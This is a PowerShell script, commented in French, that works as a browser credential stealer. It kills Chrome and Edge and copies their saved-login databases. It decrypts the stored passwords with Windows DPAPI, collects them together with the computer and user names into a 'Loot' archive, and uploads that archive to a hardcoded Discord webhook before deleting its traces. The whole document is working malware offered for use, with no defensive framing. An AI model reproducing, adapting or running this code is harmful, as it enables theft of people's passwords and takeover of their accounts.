# Télécharger SQLite si nécessaire
$sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
if (!(Test-Path $sqliteDll)) {
    $url = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"
    $zip = "$env:TEMP\sqlite.zip"
    Invoke-WebRequest -Uri $url -OutFile $zip
    Expand-Archive $zip -DestinationPath $env:TEMP -Force
    Remove-Item $zip
}

Add-Type -Path $sqliteDll
Add-Type -AssemblyName System.Security

# Fonction de déchiffrement
function Decrypt-Passwords {
    param([string]$dbPath, [string]$browser)
    
    $results = @()
    $results += "===== $browser PASSWORDS =====`n`n"
    
    try {
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        
        $count = 0
        while ($reader.Read()) {
            try {
                $url = $reader["origin_url"]
                $user = $reader["username_value"]
                $encPwd = [byte[]]$reader["password_value"]
                
                if ($encPwd.Length -gt 0) {
                    $decPwd = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encPwd, 
                        $null, 
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $password = [System.Text.Encoding]::UTF8.GetString($decPwd)
                    
                    $results += "URL: $url`n"
                    $results += "Username: $user`n"
                    $results += "Password: $password`n"
                    $results += "---`n`n"
                    $count++
                }
            } catch {
                # Skip failed decryptions
            }
        }
        
        $conn.Close()
        $results += "`nTotal: $count passwords`n`n"
    } catch {
        $results += "ERROR: $($_.Exception.Message)`n"
    }
    
    return $results
}

# Kill browsers
taskkill /F /IM chrome.exe /T 2>$null
taskkill /F /IM msedge.exe /T 2>$null

# Create output folder
cd $env:TEMP
mkdir Loot -Force | Out-Null

# Copy databases
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"

Copy-Item $chromePath "$env:TEMP\Loot\Chrome_Passwords.db" -EA 0
Copy-Item $edgePath "$env:TEMP\Loot\Edge_Passwords.db" -EA 0

# Decrypt Chrome
$chromeResults = Decrypt-Passwords "$env:TEMP\Loot\Chrome_Passwords.db" "CHROME"
$chromeResults | Out-File "$env:TEMP\Loot\CHROME_PASSWORDS.txt"

# Decrypt Edge
$edgeResults = Decrypt-Passwords "$env:TEMP\Loot\Edge_Passwords.db" "EDGE"
$edgeResults | Out-File "$env:TEMP\Loot\EDGE_PASSWORDS.txt"

# System info
@"
COMPUTER: $env:COMPUTERNAME
USER: $env:USERNAME
DATE: $(Get-Date)
"@ | Out-File "$env:TEMP\Loot\SYSTEM_INFO.txt"

# Compress
Compress-Archive -Path "$env:TEMP\Loot\*" -DestinationPath "$env:TEMP\loot.zip" -Force

# Upload to Discord
$webhook = "https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"
curl.exe -F "file=@$env:TEMP\loot.zip" -F "content=**New loot from $env:COMPUTERNAME**" $webhook

# Cleanup
Start-Sleep -Seconds 3
Remove-Item "$env:TEMP\loot.zip","$env:TEMP\Loot" -Recurse -Force -EA 0